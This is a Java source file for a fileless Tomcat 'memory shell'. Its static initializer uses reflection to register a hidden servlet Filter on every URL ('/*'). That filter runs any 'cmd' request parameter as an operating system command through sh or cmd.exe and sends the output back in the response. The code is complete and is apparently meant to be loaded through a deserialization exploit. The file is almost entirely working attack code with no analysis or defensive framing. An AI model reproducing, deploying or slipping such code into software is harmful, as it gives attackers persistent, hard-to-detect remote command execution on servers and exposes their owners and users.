package xyz.eki.marshalexp.memshell;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Scanner;

public class MTomcatFilter {
    static {
        try {
            String filterName = MTomcatFilter.class.getSimpleName();

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigs.setAccessible(true);
            HashMap hashMap = (HashMap) filterConfigs.get(standardContext);

            if (hashMap.get(filterName) == null) {

                Filter filter = new Filter() {
                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {
                        //Filter.super.init(filterConfig);
                        //System.out.println("内存马init");
                    }

                    @Override
                    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
                        if (request.getParameter("cmd") != null) {
                            String[] cmds = {"/bin/sh","-c",request.getParameter("cmd")};
                            //String[] cmds = {"cmd", "/c", request.getParameter("cmd")};
                            String osTyp = System.getProperty("os.name");
                            InputStream in = Runtime.getRuntime().exec((osTyp != null && osTyp.toLowerCase().contains("win")) ? new String[]{"cmd.exe", "/c", request.getParameter("cmd")} : new String[]{"sh", "-c", request.getParameter("cmd")}).getInputStream();

                            byte[] bcache = new byte[1024];
                            int readSize = 0;
                            try (ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
                                while ((readSize = in.read(bcache)) != -1) {
                                    outputStream.write(bcache, 0, readSize);
                                }
                                response.getWriter().println(outputStream.toString());
                            }
                        }


                    }

                    @Override
                    public void destroy() {
                        Filter.super.destroy();
                    }
                };
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(filterName);
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(filterName);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                hashMap.put(filterName, applicationFilterConfig);
            }
        }  catch(Exception e) {
            e.printStackTrace();
        }
    }
}

